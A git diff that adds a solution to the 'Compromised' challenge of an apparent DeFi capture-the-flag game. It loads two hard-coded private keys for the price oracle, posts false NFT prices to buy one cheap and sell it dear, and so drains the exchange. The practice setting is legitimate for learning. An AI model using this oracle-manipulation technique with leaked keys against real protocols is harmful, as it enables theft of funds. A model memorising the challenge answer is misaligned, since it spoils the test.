@@ -60,7 +60,55 @@ describe('Compromised challenge', function () {
     });
 
     it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+
+        // Load wallet from Private Key
+        let privKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        var wallet1 = new ethers.Wallet(privKey1, ethers.provider);
+
+        let privKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        var wallet2 = new ethers.Wallet(privKey2, ethers.provider);
+
+
+        /*
+        // PoC : Update NFT Price using leaked private key
+        console.log(await this.oracle.getAllPricesForSymbol("DVNFT"));
+        console.log(await this.oracle.getMedianPrice("DVNFT"));
+        
+        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther("0.01"));
+        
+        console.log(await this.oracle.getAllPricesForSymbol("DVNFT"));
+        console.log(await this.oracle.getMedianPrice("DVNFT"));
+        */
+        console.log("attacker balance");
+        console.log(await ethers.provider.getBalance(attacker.address));
+
+        // Makret Manipulation (Price to low)
+        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther("0.01"));
+        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.utils.parseEther("0.01"));
+        console.log(await this.oracle.getAllPricesForSymbol("DVNFT"));
+        console.log(await this.oracle.getMedianPrice("DVNFT"));
+
+        // buy
+        let txResult = await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther("0.01")});
+        //console.log(txResult);
+        
+        // Makret Manipulation (Price to high)
+        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther("9990.01"));
+        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.utils.parseEther("9990.01"));
+        console.log(await this.oracle.getAllPricesForSymbol("DVNFT"));
+        console.log(await this.oracle.getMedianPrice("DVNFT"));
+
+        // approve & sell
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+        console.log("attacker balance");
+        console.log(await ethers.provider.getBalance(attacker.address));
+        console.log(await ethers.provider.getBalance(this.exchange.address));
+
+        // price recovery
+        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther("999"));
+        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.utils.parseEther("999"));
+
     });
 
     after(async function () {
